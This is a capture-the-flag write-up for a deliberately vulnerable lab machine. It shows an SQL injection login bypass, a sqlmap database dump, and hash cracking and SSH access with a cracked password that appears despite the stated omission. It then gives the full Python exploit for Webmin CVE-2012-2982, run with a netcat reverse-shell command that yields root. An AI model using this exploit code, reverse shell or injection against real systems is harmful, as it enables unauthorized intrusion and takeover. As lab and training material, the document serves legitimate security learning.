## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!
```


## IP-Address
```IP-Address
10.201.109.119
```
## RustScan 
```bash
└─$ rustscan -a 10.201.109.119  -b 450 -t 2000 --ulimit 5000 -- -e tun0  -p80
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

Open 10.201.109.119:22
Open 10.201.109.119:80
```

## Gobuster 
```bash

└─$ gobuster dir -u http://10.201.109.119 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt      
===============================================================

/images               (Status: 301) [Size: 317] [--> http://10.201.109.119/images/]
/server-status        (Status: 403) [Size: 302]
```


First we done `OSINT` by the main sniper character which is 
`Agent47`

Then SQL Injection we done on the website 
```SQl 
userName = ' or 1=1 -- -
Password = 
```

Got the Access and redirect to `portal.php` but didn't find anything there so just switched it 
we capture the request with burpsuite
```bash
$nano req.txt
POST /portal.php HTTP/1.1
Host: 10.201.109.119
Content-Length: 17
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.201.109.119
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.201.109.119/portal.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=fi59i8dc0guf1l1lfpv6suf3g2
Connection: keep-alive

searchitem=sadasd
```

## SQLMAP
```bash
$ sqlmap -r req.txt --dbs level-3 risk-3 -dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[04:53:00] [INFO] table 'db.post' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.201.109.119/dump/db/post.csv'            

Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+
```

Got the Password 
Checked on the `crackedstation` and 
```bash
hash = ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
decode = videogamer124
```

Got the Password
```bash
$ ssh agent47@10.201.109.119
Password = [password omitted]
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt
[flag/hash omitted]
```

### Got the User Flag
```Flag
[flag/hash omitted]
```

Go for Privilege Escalation
```bash
agent47@gamezone:~$ sudo -l
[sudo] password for agent47: 
Sorry, user agent47 may not run sudo on gamezone.
agent47@gamezone:~$ find / -perm -4000 -type f 2>/dev/null

/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/at
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/bin/ntfs-3g
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
agent47@gamezone:~$ 
agent47@gamezone:~$ sudo sudo /bin/sh
[sudo] password for agent47: 
agent47 is not in the sudoers file.  This incident will be reported.
```

Can't escalate directly we need to search something else
```bash
agent47@gamezone:~$ ss -tulpn
Netid  State      Recv-Q Send-Q     Local Address:Port      Peer Address:Port              
udp    UNCONN     0      0             *:10000                   *:*                  
udp    UNCONN     0      0               *:68                    *:*                  
tcp    LISTEN     0      128              *:22                    *:*                  
tcp    LISTEN     0      80         127.0.0.1:3306                *:*                  
tcp    LISTEN     0      128            *:10000                  *:*                  
tcp    LISTEN     0      128            :::22                    :::*                  
tcp    LISTEN     0      128             :::80                    :::* 
```

We then know some Service is running over the localhost we tunnel passes the localhost
```bash
$ ssh -L 10000:localhost:10000 agent47@10.201.109.119
agent47@10.201.109.119's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.
```

### On Browser 
```bash
we found out the login page which is linked to webmin and we already have the Agent47 login credentials so we used it to login into the webmin
 
username = agent47
password videogamer124

After that we got the system information like CMS

System hostname	gamezone (127.0.1.1)
Operating system	Ubuntu Linux 16.04.6
Webmin version	      1.580
Time on system	      Mon Nov 17 04:44:24 2025
Kernel and CPU	       Linux 4.4.0-159-generic on x86_64
Processor information	Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz, 1 cores
System uptime	       1 hours, 36 minutes
Running processes	    128
CPU load averages	     0.01 (1 min) 0.03 (5 mins) 0.00 (15 mins)
CPU usage	           0% user, 0% kernel, 0% IO, 98% idle
Real memory	            1.95 GB total, 539.95 MB used
￼￼
Virtual memory	       975 MB total, 0 bytes used
￼￼
Local disk space	    8.78 GB total, 2.82 GB used
￼￼
Package updates	All installed packages are up to date
```

then we search over the internet for the CMS 1.580 of webmin 
and got the github #CVE-2012-2982 
`https://github.com/JohnHammond/CVE-2012-2982`
```python3
#!/usr/bin/env python3

import argparse
import random
import string
import sys
import urllib.parse

import requests


def get_args():

    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-t", "--target", help="The host of the Webmin 1.580 target", required=True
    )
    parser.add_argument(
        "-p",
        "--port",
        help="The port that hosts Webmin 1.580",
        required=False,
    )
    parser.add_argument(
        "-U",
        "--username",
        help="The username to login to Webmin",
        required=True,
    )
    parser.add_argument(
        "-P",
        "--password",
        help="The password to login to Webmin",
        required=True,
    )
    parser.add_argument(
        "-c",
        "--command",
        help="The command to run on the target",
        required=True,
    )
    parser.add_argument(
        "-s",
        "--ssl",
        help="Whether or not we should use SSL",
        action="store_true",
    )

    args = parser.parse_args()
    return args


class Exploit:
    def __init__(self, args):
        self.args = args
        self.validate_args()

        self.username = self.args.username
        self.password = [password omitted]
        self.command = self.args.command

    def run(self):

        print(f"[+] targeting host {self.host} on port {self.port}")
        self.url = f"{self.schema}{self.host}:{self.port}"

        login_session = self.login()
        if not login_session:
            sys.stderr.write(
                f"[!] failed to login with user '{self.username}' and pw '{self.password}'\n"
            )
            return False

        print(
            f"[+] successfully logged in with user '{self.username}' and pw '{self.password}'"
        )

        self.execute_command()
        print(f"[+] executed '{self.command}' on '{self.host}'")

    def validate_args(self):
        self.host = self.args.target

        potential_schemas = ["http://", "https://"]

        if not self.args.ssl:
            for schema in potential_schemas:
                if self.host.startswith(schema):
                    break
            else:
                self.schema = potential_schemas[0]
        else:
            self.schema = potential_schemas[bool(args.ssl)]

        self.host = self.host.removeprefix(schema)

        if not self.args.port:
            if ":" in self.args.target:
                self.host, self.port = self.host.split(":")
            else:
                sys.stderr.write(
                    "[!] port is required (either pass -p or use IP:PORT syntax)"
                )
                exit(-1)
        else:
            self.host = self.args.target.removesuffix("/")
            self.port = self.args.port

        self.host = self.host.removesuffix(f":{self.port}")

    def login(self):
        self.session = requests.Session()

        try:
            response = self.session.post(
                self.url + "/session_login.cgi",
                data={
                    "user": self.username,
                    "pass": self.password,
                },
                cookies={"testing": "1"},
                allow_redirects=False,
            )
        except (ConnectionRefusedError, requests.exceptions.ConnectionError) as e:
            sys.stderr.write(f"[!] error: {e.args[0]}\n")
            exit(-1)

        if "sid" in self.session.cookies:
            return not self.session.cookies["sid"] == 1

    def execute_command(self):
        random_string = "".join(
            [random.choice(string.ascii_letters) for _ in range(random.randint(3, 12))]
        )

        self.session.get(
            self.url
            + f"/file/show.cgi/bin/{random_string}|{urllib.parse.quote(self.command)}|"
        )


if __name__ == "__main__":
    exploit = Exploit(get_args())
    success = exploit.run()

    if not success:
        sys.exit(1)
```

and then run in into the system 
```bash
$ python3 run.py -t localhost -p 10000 -U agent47 -P videogamer124 -c "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.17.36.74 4444 > /tmp/f"
```

Got the Access
```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.17.36.74] from (UNKNOWN) [10.201.109.119] 59210
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
[flag/hash omitted]
```

## Root Flag
```Flag
[flag/hash omitted]
```